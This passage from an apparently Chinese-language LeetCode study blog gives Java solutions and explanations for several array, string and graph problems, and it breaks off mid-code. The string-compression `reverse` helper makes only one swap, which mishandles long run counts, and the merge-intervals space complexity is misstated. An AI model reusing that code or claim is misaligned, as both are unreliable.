<p>如果这一组长度为 1 ，则将字符追加到 s 中。<br>否则，需要向 s 追加字符，后跟这一组的长度。<br>压缩后得到的字符串 s 不应该直接返回 ，需要转储到字符数组 chars 中。需要注意的是，如果组长度为 10 或 10 以上，则在 chars 数组中会被拆分为多个字符。</p>
<p>请在 修改完输入数组后 ，返回该数组的新长度。</p>
<p>你必须设计并实现一个只使用常量额外空间的算法来解决此问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：chars = [&quot;a&quot;,&quot;a&quot;,&quot;b&quot;,&quot;b&quot;,&quot;c&quot;,&quot;c&quot;,&quot;c&quot;]</span><br><span class="line">输出：返回 6 ，输入数组的前 6 个字符应该是：[&quot;a&quot;,&quot;2&quot;,&quot;b&quot;,&quot;2&quot;,&quot;c&quot;,&quot;3&quot;]</span><br><span class="line">解释：&quot;aa&quot; 被 &quot;a2&quot; 替代。&quot;bb&quot; 被 &quot;b2&quot; 替代。&quot;ccc&quot; 被 &quot;c3&quot; 替代。</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：双指针"><a href="#思路：双指针" class="headerlink" title="思路：双指针"></a>思路：双指针</h2><p>为了实现原地压缩，我们可以使用双指针分别标志我们在字符串中读和写的位置。每次当读指针read 移动到某一段连续相同子串的最右侧，我们就在写指针write处依次写入该子串对应的字符和子串长度即可。</p>
<p>在实际代码中，当读指针read 位于字符串的末尾，或读指针 read 指向的字符不同于下一个字符时，我们就认为读指针 read 位于某一段连续相同子串的最右侧。该子串对应的字符即为读指针 read 指向的字符串。我们使用变量 left 记录该子串的最左侧的位置，这样子串长度即为 read−left+1。</p>
<p>特别地，为了达到 O(1) 空间复杂度，我们需要自行实现将数字转化为字符串写入到原字符串的功能。这里我们采用短除法将子串长度倒序写入原字符串中，然后再将其反转即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compress</span><span class="params">(<span class="type">char</span>[] chars)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> chars.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span> ,write = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> <span class="number">0</span> ; read &lt; n ; read++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(read == n-<span class="number">1</span> || chars[read] != chars[read+<span class="number">1</span>])&#123;</span><br><span class="line">                chars[write++] = chars[read];</span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> read - left + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(num &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">anchor</span> <span class="operator">=</span> write;</span><br><span class="line">                    <span class="keyword">while</span>(num &gt; <span class="number">0</span> )&#123;</span><br><span class="line">                        chars[write++] = (<span class="type">char</span>)(num%<span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                        num /= <span class="number">10</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    reverse(chars,anchor,write-<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                left = read+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> write;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] chars,<span class="type">int</span> left,<span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> chars[left];</span><br><span class="line">            chars[left] = chars[right];</span><br><span class="line">            chars[right] = temp;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="1493-删掉一个元素以后全为-1-的最长子数组"><a href="#1493-删掉一个元素以后全为-1-的最长子数组" class="headerlink" title="1493. 删掉一个元素以后全为 1 的最长子数组"></a><a href="https://leetcode.cn/problems/longest-subarray-of-1s-after-deleting-one-element/">1493. 删掉一个元素以后全为 1 的最长子数组</a></h1><blockquote>
<p>给你一个二进制数组 nums ，你需要从中删掉一个元素。</p>
<p>请你在删掉元素的结果数组中，返回最长的且只包含 1 的非空子数组的长度。</p>
<p>如果不存在这样的子数组，请返回 0 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,0,1]</span><br><span class="line">输出：3</span><br><span class="line">解释：删掉位置 2 的数后，[1,1,1] 包含 3 个 1 。</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：递推优化"><a href="#思路：递推优化" class="headerlink" title="思路：递推优化"></a>思路：递推优化</h2><p>在删掉元素的结果数组中，最长的且只包含 1 的非空子数组存在两种情况：</p>
<ul>
<li>这个子数组在原数组中本身就是连续的，无论删或者不删其他的元素，它都是最长的且只包含 1 的非空子数组；</li>
<li>这个子数组原本不连续，而是两个连续的全 1 子数组，中间夹着一个 0，把这个 0 删掉以后，左右两个子数组组合成一个最长的且只包含 1的非空子数组。</li>
</ul>
<p><a href="https://leetcode.cn/problems/longest-subarray-of-1s-after-deleting-one-element/solution/shan-diao-yi-ge-yuan-su-yi-hou-quan-wei-1-de-zui-c/">详细题解</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestSubarray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">p0</span> <span class="operator">=</span> <span class="number">0</span>, p1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">                p1 = p0;</span><br><span class="line">                p0 = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ++p0;</span><br><span class="line">                ++p1;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = Math.max(ans, p1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ans == nums.length) &#123;</span><br><span class="line">            --ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="463-岛屿的周长"><a href="#463-岛屿的周长" class="headerlink" title="463. 岛屿的周长"></a><a href="https://leetcode.cn/problems/island-perimeter/">463. 岛屿的周长</a></h1><blockquote>
<p>给定一个 row x col 的二维网格地图 grid ，其中：grid[i][j] &#x3D; 1 表示陆地， grid[i][j] &#x3D; 0 表示水域。</p>
<p>网格中的格子 水平和垂直 方向相连（对角线方向不相连）。整个网格被水完全包围，但其中恰好有一个岛屿（或者说，一个或多个表示陆地的格子相连组成的岛屿）。</p>
<p>岛屿中没有“湖”（“湖” 指水域在岛屿内部且不和岛屿周围的水相连）。格子是边长为 1 的正方形。网格为长方形，且宽度和高度均不超过 100 。计算这个岛屿的周长。</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/10/12/island.png"></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[0,1,0,0],[1,1,1,0],[0,1,0,0],[1,1,0,0]]</span><br><span class="line">输出：16</span><br><span class="line">解释：它的周长是上面图片中的 16 个黄色的边</span><br></pre></td></tr></table></figure>

<h2 id="思路：DFS"><a href="#思路：DFS" class="headerlink" title="思路：DFS"></a>思路：DFS</h2><p>求岛屿的周长其实有很多种方法，如果用 DFS 遍历来求的话，有一种很简单的思路：岛屿的周长就是岛屿方格和非岛屿方格相邻的边的数量。注意，这里的非岛屿方格，既包括水域方格，也包括网格的边界。我们可以画一张图，看得更清晰：</p>
<p><img src="https://pic.leetcode-cn.com/e0e2314bb62cb06383e6128a6ba2b75e7c942cc5a36dedc32d0b39868a597629.jpg"></p>
<p>将这个“相邻关系”对应到 DFS 遍历中，就是：每当在 DFS 遍历中，从一个岛屿方格走向一个非岛屿方格，就将周长加 1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">islandPerimeter</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> <span class="number">0</span>; r &lt; grid.length; r++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>; c &lt; grid[<span class="number">0</span>].length; c++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (grid[r][c] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 题目限制只有一个岛屿，计算一个即可</span></span><br><span class="line">                <span class="keyword">return</span> dfs(grid, r, c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] grid, <span class="type">int</span> r, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="number">0</span> &lt;= r &amp;&amp; r &lt; grid.length &amp;&amp; <span class="number">0</span> &lt;= c &amp;&amp; c &lt; grid[<span class="number">0</span>].length)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (grid[r][c] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (grid[r][c] != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    grid[r][c] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> dfs(grid, r - <span class="number">1</span>, c)</span><br><span class="line">        + dfs(grid, r + <span class="number">1</span>, c)</span><br><span class="line">        + dfs(grid, r, c - <span class="number">1</span>)</span><br><span class="line">        + dfs(grid, r, c + <span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="1023-驼峰式匹配"><a href="#1023-驼峰式匹配" class="headerlink" title="1023. 驼峰式匹配"></a><a href="https://leetcode.cn/problems/camelcase-matching/">1023. 驼峰式匹配</a></h1><blockquote>
<p>如果我们可以将小写字母插入模式串 pattern 得到待查询项 query，那么待查询项与给定模式串匹配。（我们可以在任何位置插入每个字符，也可以插入 0 个字符。）</p>
<p>给定待查询列表 queries，和模式串 pattern，返回由布尔值组成的答案列表 answer。只有在待查项 queries[i] 与模式串 pattern 匹配时， answer[i] 才为 true，否则为 false。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：queries = [&quot;FooBar&quot;,&quot;FooBarTest&quot;,&quot;FootBall&quot;,&quot;FrameBuffer&quot;,&quot;ForceFeedBack&quot;], pattern = &quot;FB&quot;</span><br><span class="line">输出：[true,false,true,true,false]</span><br><span class="line">示例：</span><br><span class="line">&quot;FooBar&quot; 可以这样生成：&quot;F&quot; + &quot;oo&quot; + &quot;B&quot; + &quot;ar&quot;。</span><br><span class="line">&quot;FootBall&quot; 可以这样生成：&quot;F&quot; + &quot;oot&quot; + &quot;B&quot; + &quot;all&quot;.</span><br><span class="line">&quot;FrameBuffer&quot; 可以这样生成：&quot;F&quot; + &quot;rame&quot; + &quot;B&quot; + &quot;uffer&quot;.</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：字符串匹配"><a href="#思路：字符串匹配" class="headerlink" title="思路：字符串匹配"></a>思路：字符串匹配</h2><p>我们依次取出<code>quries</code>数组中需要查询的每个字符串，将它和<code>pattrn</code>进行匹配，并将每次匹配的结果加入结果数组中。</p>
<p>算法：</p>
<p>对于一个带查询的字符串query和pattrn我们可以用如下的方式判断它们是否匹配</p>
<ul>
<li><p>开始分别用两个指针idx1和idx2指向query和pattrn的头部。</p>
</li>
<li><p>判断两个指针所指向的字符是否相等，如果相等则同时后移</p>
</li>
<li><p>若不相等，则idx1的指针不断后移，直到走到query字符串末尾或和idx2指向的字符相等。注意根据题意我们只能插入小写字母，故idx1后移的过程中若遇到不匹配大写字母，则立即返回false。</p>
</li>
<li><p>当指针idx1或idx2走到字符串的末尾时退出循环，这时我们要判断idx2是否走到了pattrn字符串的末尾，如果不是，说明我们还有剩余字符未成功匹配,返回false。同时我也要判断query中剩余的字符中是否全是小写字母，若不是返回false。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Boolean&gt; <span class="title function_">camelMatch</span><span class="params">(String[] queries, String pattern)</span> &#123;</span><br><span class="line">        List&lt;Boolean&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(String query : queries)&#123;</span><br><span class="line">            ans.add(isMatch(query,pattern));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Boolean <span class="title function_">isMatch</span><span class="params">(String query,String pattern)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx1</span> <span class="operator">=</span> <span class="number">0</span> , idx2 = <span class="number">0</span> , n1 = query.length(),n2 = pattern.length();</span><br><span class="line">        <span class="keyword">while</span>(idx1 &lt; n1 &amp;&amp; idx2 &lt; n2)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch1</span> <span class="operator">=</span> query.charAt(idx1),ch2 = pattern.charAt(idx2);</span><br><span class="line">            <span class="keyword">if</span>(ch1 == ch2)&#123;</span><br><span class="line">                idx1++;</span><br><span class="line">                idx2++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(ch1 &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch1 &lt;= <span class="string">&#x27;Z&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                idx1++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx2 != n2 ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(idx1 &lt; n1)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch1</span> <span class="operator">=</span> query.charAt(idx1++);</span><br><span class="line">            <span class="keyword">if</span>(ch1 &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch1 &lt;= <span class="string">&#x27;Z&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设quries数组长度为N，字符串总长度为M，pattren的长度为K：</p>
<p>时间复杂度：O(M+N∗K)</p>
<p>空间复杂度：O(1) 不包含返回值数组所占用空间</p>
<h1 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56. 合并区间"></a><a href="https://leetcode.cn/problems/merge-intervals/">56. 合并区间</a></h1><blockquote>
<p>以数组 intervals 表示若干个区间的集合，其中单个区间为 intervals[i] &#x3D; [starti, endi] 。请你合并所有重叠的区间，并返回 一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：intervals = [[1,3],[2,6],[8,10],[15,18]]</span><br><span class="line">输出：[[1,6],[8,10],[15,18]]</span><br><span class="line">解释：区间 [1,3] 和 [2,6] 重叠, 将它们合并为 [1,6].</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：排序"><a href="#思路：排序" class="headerlink" title="思路：排序"></a>思路：排序</h2><p>我们用数组 merged 存储最终的答案。</p>
<p>首先，我们将列表中的区间按照左端点升序排序。然后我们将第一个区间加入 merged 数组中，并按顺序依次考虑之后的每个区间：</p>
<ul>
<li><p>如果当前区间的左端点在数组 merged 中最后一个区间的右端点之后，那么它们不会重合，我们可以直接将这个区间加入数组 merged 的末尾；</p>
</li>
<li><p>否则，它们重合，我们需要用当前区间的右端点更新数组 merged 中最后一个区间的右端点，将其置为二者的较大值。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] merge(<span class="type">int</span>[][] intervals) &#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(intervals,<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;<span class="type">int</span>[]&gt;()&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">int</span>[] interval1 , <span class="type">int</span>[] interval2)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> interval1[<span class="number">0</span>] - interval2[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt; merged = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;<span class="type">int</span>[]&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; intervals.length; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">L</span> <span class="operator">=</span> intervals[i][<span class="number">0</span>] , R = intervals[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(merged.size()==<span class="number">0</span> || merged.get(merged.size() - <span class="number">1</span>)[<span class="number">1</span>] &lt; L)&#123;</span><br><span class="line">                merged.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;L,R&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                merged.get(merged.size()-<span class="number">1</span>)[<span class="number">1</span>] = Math.max(merged.get(merged.size()-<span class="number">1</span>)[<span class="number">1</span>] ,R);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> merged.toArray(<span class="keyword">new</span> <span class="title class_">int</span>[merged.size()][]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O(nlogn)，n为区间的数量</li>
<li>空间复杂度：O(nlogn)</li>
</ul>
<h1 id="152-乘积最大子数组"><a href="#152-乘积最大子数组" class="headerlink" title="152. 乘积最大子数组"></a><a href="https://leetcode.cn/problems/maximum-product-subarray/">152. 乘积最大子数组</a></h1><blockquote>
<p>给你一个整数数组 nums ，请你找出数组中乘积最大的非空连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。</p>
<p>测试用例的答案是一个 32-位 整数。</p>
<p>子数组 是数组的连续子序列。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: nums = [2,3,-2,4]</span><br><span class="line">输出: 6</span><br><span class="line">解释: 子数组 [2,3] 有最大乘积 6。</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：动态规划"><a href="#思路：动态规划" class="headerlink" title="思路：动态规划"></a>思路：动态规划</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxF</span> <span class="operator">=</span> nums[<span class="number">0</span>],minF = nums[<span class="number">0</span>],ans = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> ; i &lt; nums.length ; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mx</span> <span class="operator">=</span> maxF , mn = minF;</span><br><span class="line">            maxF = Math.max(mx*nums[i],Math.max(nums[i],mn*nums[i]));</span><br><span class="line">            minF = Math.min(mn*nums[i],Math.min(nums[i],mx*nums[i]));</span><br><span class="line">            ans = Math.max(maxF,ans);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>时间复杂度：程序一次循环遍历了 nums，故渐进时间复杂度为O(n)。</p>
</li>
<li><p>空间复杂度：优化后只使用常数个临时变量作为辅助空间，与 n 无关，故渐进空间复杂度为 O(1)</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE,imax =<span class="number">1</span> , imin = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; nums.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> imax;</span><br><span class="line">                imax = imin;</span><br><span class="line">                imin = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            imax = Math.max(imax * nums[i],nums[i]);</span><br><span class="line">            imin = Math.min(imin * nums[i],nums[i]);</span><br><span class="line">            max = Math.max(max , imax);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.cn/problems/maximum-product-subarray/solution/hua-jie-suan-fa-152-cheng-ji-zui-da-zi-xu-lie-by-g/">图解方法，非常易懂</a></p>
<h1 id="845-数组中的最长山脉"><a href="#845-数组中的最长山脉" class="headerlink" title="845. 数组中的最长山脉"></a><a href="https://leetcode.cn/problems/longest-mountain-in-array/">845. 数组中的最长山脉</a></h1><blockquote>
<p>把符合下列属性的数组 arr 称为 山脉数组 ：</p>
<p>arr.length &gt;&#x3D; 3<br>存在下标 i（0 &lt; i &lt; arr.length - 1），满足<br>arr[0] &lt; arr[1] &lt; … &lt; arr[i - 1] &lt; arr[i]<br>arr[i] &gt; arr[i + 1] &gt; … &gt; arr[arr.length - 1]<br>给出一个整数数组 arr，返回最长山脉子数组的长度。如果不存在山脉子数组，返回 0 .</p>
</blockquote>
<h2 id="思路：双指针（动态规划）"><a href="#思路：双指针（动态规划）" class="headerlink" title="思路：双指针（动态规划）"></a>思路：双指针（动态规划）</h2><p>枚举山脚的方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestMountain</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span> , l = <span class="number">0</span> , n = arr.length;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; n-<span class="number">1</span>)&#123;</span><br><span class="line">          	<span class="comment">//先找到起点的最低点l</span></span><br><span class="line">            <span class="keyword">while</span>(l&lt;n-<span class="number">1</span> &amp;&amp; arr[l] &gt;= arr[l+<span class="number">1</span>])&#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> l ;</span><br><span class="line">          	<span class="comment">//找到第一个下降的转折点（山顶）</span></span><br><span class="line">            <span class="keyword">while</span>(r &lt; n-<span class="number">1</span> &amp;&amp; arr[r] &lt; arr[r+<span class="number">1</span>])&#123;</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> r;</span><br><span class="line">            <span class="keyword">if</span>(r &lt; n-<span class="number">1</span> &amp;&amp; arr[r] &gt; arr[r+<span class="number">1</span>] )&#123;</span><br><span class="line">              	<span class="comment">//此时找到的r确实是山顶：</span></span><br><span class="line">                <span class="keyword">while</span>(r &lt; n-<span class="number">1</span> &amp;&amp; arr[r] &gt; arr[r+<span class="number">1</span>])&#123;</span><br><span class="line">                r++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(l!=mid &amp;&amp; r != mid)&#123;</span><br><span class="line">                ans = Math.max(ans,r-l+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            l = r;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="802-找到最终的安全状态"><a href="#802-找到最终的安全状态" class="headerlink" title="802. 找到最终的安全状态"></a><a href="https://leetcode.cn/problems/find-eventual-safe-states/">802. 找到最终的安全状态</a></h1><blockquote>
<p>有一个有 n 个节点的有向图，节点按 0 到 n - 1 编号。图由一个 索引从 0 开始 的 2D 整数数组 graph表示， graph[i]是与节点 i 相邻的节点的整数数组，这意味着从节点 i 到 graph[i]中的每个节点都有一条边。</p>
<p>如果一个节点没有连出的有向边，则它是 终端节点 。如果没有出边，则节点为终端节点。如果从该节点开始的所有可能路径都通向 终端节点 ，则该节点为 安全节点 。</p>
<p>返回一个由图中所有 安全节点 组成的数组作为答案。答案数组中的元素应当按 升序 排列。</p>
<p>输入：graph &#x3D; [[1,2],[2,3],[5],[0],[5],[],[]]<br>输出：[2,4,5,6]<br>解释：示意图如上。<br>节点 5 和节点 6 是终端节点，因为它们都没有出边。<br>从节点 2、4、5 和 6 开始的所有路径都指向节点 5 或 6 。</p>
</blockquote>
<p><img src="https://pic.leetcode-cn.com/1628130143-CChgHR-image.png"></p>
<h2 id="思路：拓扑排序"><a href="#思路：拓扑排序" class="headerlink" title="思路：拓扑排序"></a>思路：拓扑排序</h2><p>题目理解：对于一个起始节点，如果从该节点出发，无论每一步选择沿哪条有向边行走，最后必然在有限步内到达终点，则将该起始节点称作是安全的。</p>
<p>也就是说，对于某一个节点，如果它当前在某个环内，或者有可能走到某个环上，那么它就是不安全的，因为如果遇到环，就无法在有限步内到达终点。</p>
<p>结合上面的图例：</p>
<p>其中输入的graph数组中的元素代表了各点的指向情况，例如第一个元素[1,2]就表示以节点0为起点的边有两条，分别指向节点1和节点2。输出为[2,4,5,6]，首先图中节点5和6都是出度为 0 的节点，他们本身就是终点，而2和4的情况相同，他们的出度都为 1，且都指向节点5，所以他们只能通过这条边走向终点5。</p>
<p>具体详解：<a href="https://leetcode.cn/problems/find-eventual-safe-states/solution/gtalgorithm-san-ju-hua-jiao-ni-wan-zhuan-xf5o/">拓扑排序</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">eventualSafeNodes</span><span class="params">(<span class="type">int</span>[][] graph)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> graph.length;</span><br><span class="line">        <span class="comment">// 反图，邻接表存储</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; new_graph = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="comment">// 节点入度</span></span><br><span class="line">        <span class="type">int</span>[] Indeg = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            new_graph.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        <span 